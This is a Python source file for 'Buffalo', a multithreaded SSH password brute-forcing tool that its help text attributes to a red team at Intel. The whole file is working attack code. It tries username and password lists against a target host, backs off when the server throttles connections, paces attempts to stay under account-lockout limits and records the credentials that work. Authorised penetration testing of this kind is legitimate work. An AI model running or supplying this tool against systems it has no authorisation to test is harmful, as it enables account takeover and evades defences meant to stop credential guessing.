import os
import time
import queue
import logging
import argparse
import paramiko
import threading
from colorama import init, Fore

timeout: int = 5                             # Timeout for SSH connections.
cool_it: int = 10                            # Cool down time if brute force is detected (in seconds).
user_dict: dict = dict()                     # Blank dictionary for users.
q = queue.Queue(maxsize=0)                   # FIFO queue to hold the users.
valid_creds: list = list()                   # Empty list to store valid credentials.
lock = threading.Lock()                      # Lock user_dict and valid_creds.
logging.basicConfig(level=logging.CRITICAL)  # Suppress Paramiko printing exception chains.


def read_file(input_file: str) -> list:
    """
    Reads a text file and returns a list build from the contents of each line.
    :param input_file: String file name and path.
    :return: List of strings from file.
    """
    try:
        word_list: list = open(input_file, 'r').read().splitlines()
        return word_list
    except (FileNotFoundError, PermissionError, UnicodeDecodeError) as e:
        print(f"Error reading {input_file} \n {e}")
        exit(1)


def attempt_ssh(target: str, port: int, user: str, password: str, test: bool) -> bool:
    """
    Attempt an SSH connection to a target host and port via the specified user and password.

    :param target: Target IP or Hostname
    :param port: SSH Port
    :param user: User to try
    :param password: Password to try
    :param test: If True this is a test, if false it's a worker thread.
    :return: True if SSH attempt was successful, false otherwise.
    """
    # Initialize SSH client
    client = paramiko.SSHClient()

    # Fixes paramiko.ssh_exception.SSHException: Server 'WHATEVER_HOST' not found in known_hosts...error
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    # Attempt an SSH connection to the target.
    try:
        client.connect(hostname=target, port=port, username=user, password=password, timeout=timeout)

    # This means we're not able to connect to attempt anything on the port
    except paramiko.ssh_exception.NoValidConnectionsError:
        banner(f"{Fore.RED}Cannot connect to {target} on port {port}, quitting.")
        exit(1)

    # This means the credentials are wrong...
    except paramiko.AuthenticationException:
        return False

    # This means we've exceeded the quota (paramiko.ssh_exception.SSHException: Error reading SSH protocol banner)...
    except paramiko.ssh_exception.SSHException:
        # If this happens during the test run, exit with a failure because it's probably PasswordAuthentication no
        if test:
            banner(f"{Fore.RED}{target} likely has PasswordAuthentication turned off, quitting.")
            exit(1)
        banner(f"{Fore.MAGENTA}Cool down on {user} thread for {cool_it} seconds.")
        time.sleep(cool_it)  # Wait the cool down period.
        return attempt_ssh(target, port, user, password, False)   # Recursively attempt the previous request.

    # This means we've probably found something :)
    return True


def brute_thread(user_queue: queue, passwords: list, target: str, port: int, max_attempts: int, lo: int) -> None:
    """
    A worker thread tied to a user account.

    :param user_queue: User queue.
    :param passwords: Password list to try.
    :param target: Target IP or Hostname.
    :param port: SSH Port.
    :param max_attempts: The maximum number of credentials to try on an account within the lockout window.
    :param lo: The lockout period, time to wait after reaching maximum attempts.
    :return: None
    """

    # Infinite loop until there's no work to be done.
    while True:
        attempts: int = 0   # Number of credentials tried in timeframe.

        # Loop to find a user with a good timestamp.
        while True:
            user = user_queue.get()  # Get a user from the queue.
            lock.acquire()
            # Check if lockout time is passed
            if (time.time() - user_dict[user]['lockout_stamp']) > lo:
                queue_index: int = user_dict[user]['password_index']  # Get start index in password array.
                lock.release()
                break
            user_queue.put(user)  # Throw it back in the queue.
            lock.release()

        # Start password attempts where we last left off.
        for password in passwords[queue_index:]:

            # We've reached the attempt limit.
            if lo > 0 and attempts >= max_attempts > 0:
                banner(f"{Fore.YELLOW}Lockout limit reached for {user}, pausing thread for {lo/60} minutes.")
                lock.acquire()  # Lock user_dict
                user_dict[user]['password_index'] += attempts   # Update the password index by number of attempts made.
                user_dict[user]['lockout_stamp'] = time.time()  # Set lockout time to now.
                lock.release()          # Release the lock for user_dict
                user_queue.put(user)    # Put the user back into the Queue.
                break

            # If we've found a successful set of credentials.
            if attempt_ssh(target, port, user, password, False):
                lock.acquire()
                valid_creds.append(f"{user}:{password}")
                lock.release()
                user_queue.task_done()  # Password found, this user task is done.
                break

            else:
                banner(f"{Fore.CYAN}Attempt  {user}:{password}")

            time.sleep(.3)  # Calm it down a bit...
            attempts += 1   # Increase number of attempts made by thread.

            # Are we finished attempting all passwords.
            if not passwords[user_dict[user]['password_index'] + attempts:]:
                user_queue.task_done()  # All passwords attempted for this user.


def banner(status: str) -> None:
    """
    This prints the buffalo header
    :param status:
    :return: Nothing
    """
    if os.name == 'nt':
        os.system("cls")
    else:
        os.system("clear")

    print(f"""{Fore.WHITE}Buffalo
            _.-````'-,_
   _,.,_ ,-'`           `'-.,_
 /)     (\                   '``-.
((      ) )                      `\\
 \)    (_/                        )\\
  |       /)           '    ,'    / \\
  `\    ^'            '     (    /  ))
    |      _/\ ,     /    ,,`\   (  "`
     \Y,   |  \  \  | ````| / \_ \\
       `)_/    \  \  )    ( >  ( >
                \( \(     |/   |/
                /_(/_(    /_(  /_(
                @author Ryan Kozak\n""")

    for credentials in valid_creds:
        print(f"{Fore.GREEN}Valid Creds - {credentials}")
    print(f"{status}")


def main():

    start_time = time.time()

    # Define the commandline arguments.
    parser = argparse.ArgumentParser(description="Quick SSH brute force script for Red Team @Intel.")
    parser.add_argument("target", help="Target IP or hostname.")
    parser.add_argument("users", help="Username file, one username per line.")
    parser.add_argument("passwords", help="Password file, one password per line.")
    parser.add_argument("--port", nargs='?', const=22, default=22, type=int,
                        help="SSH port. DEFAULT 22.")
    parser.add_argument("--max_attempts", nargs='?', const=0, default=0, type=int,
                        help="Max attempts per account within the lockout window. DEFAULT unlimited.")
    parser.add_argument("--lockout_period", nargs='?', const=0, default=0, type=int,
                        help="Length of the lockout window in minutes. DEFAULT 0.")
    parser.add_argument("--threads", nargs='?', const=100, default=100, type=int,
                        help="Thread count. DEFAULT 100.")

    args = parser.parse_args()  # Parser Namespace.

    # Terminal Colors For Windows
    if os.name == 'nt':
        init()

    attempt_ssh(args.target, args.port, 'dummy', 'password', True)  # Test the target/port, and exit if it's no good.

    users: list = read_file(args.users)          # Read file to build list of users.
    passwords: list = read_file(args.passwords)  # Read file to build list of passwords.

    # Put users in queue, and global dictionary.
    for user in users:
        q.put(user)
        user_dict[user] = {
            "password_index": 0,  # Current location in password array.
            "lockout_stamp": 0,    # Timestamp that user reached last reached lockout limit.
        }

    # Loop to create worker threads, limit is user specified.
    for t in range(args.threads):
        # Define the thread
        new_thread = threading.Thread(target=brute_thread,
                                      args=(q, passwords, args.target, args.port, args.max_attempts,
                                            args.lockout_period*60),
                                      daemon=True)
        new_thread.start()  # Start new thead

    q.join()  # Wait for threads to complete

    banner(f"{Fore.WHITE}Completed, elapsed time: {(time.time() - start_time)/60} minutes.")


if __name__ == "__main__":
    main()
